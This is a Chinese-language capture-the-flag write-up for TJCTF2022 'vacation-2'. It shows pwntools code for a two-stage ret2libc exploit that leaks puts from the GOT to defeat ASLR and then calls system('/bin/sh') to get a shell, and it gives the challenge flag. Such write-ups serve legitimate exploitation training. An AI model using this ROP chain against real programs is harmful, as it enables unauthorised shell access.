# TJCTF2022 vacation-2

## 题目简述

程序仍在 16 字节栈缓冲区中执行 `fgets(buf, 64, stdin)`，返回地址偏移仍为 `0x18`。与 vacation-1 不同，本题移除了 `shell_land`，因此需要先泄漏随 ASLR 变化的 libc 地址，再构造 ret2libc 调用 `system("/bin/sh")`。

## 解题过程

二进制未开启 PIE，可以直接使用程序内的 `pop rdi; ret`、`puts@plt`、`puts@got` 和 `main`。第一阶段让 `puts` 打印自身 GOT 表项，再回到 `main` 接收第二次输入：

```python
pop_rdi = 0x401243
stage1 = flat([
    b'A' * 0x18,
    pop_rdi, exe.got['puts'],
    exe.plt['puts'], exe.sym['main'],
])
io.sendline(stage1)
leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
```

有了 libc 基址后，定位 `/bin/sh` 与 `system`。第二阶段在调用前插入一个单独的 `ret`（官方脚本用 `pop_rdi + 1`）以满足 x86-64 栈对齐：

```python
stage2 = flat([
    b'A' * 0x18,
    pop_rdi, next(libc.search(b'/bin/sh\x00')),
    pop_rdi + 1, libc.sym['system'],
])
io.sendline(stage2)
```

进入 shell 后读取 `flag.txt`，得到 `tjctf{w3_g0_wher3_w3_w4nt_t0!_66f7020620e343ff}`。

## 方法总结

本题把 ret2win 提升为标准的两阶段 ret2libc：先用可复用的输出函数泄漏地址并返回主循环，再基于精确 libc 构造最终调用。复现时要使用题目随附的 `libc-2.31.so`，否则符号偏移不一致；同时保留对齐用的 `ret`，避免 `system` 内部因栈未按 ABI 对齐而崩溃。
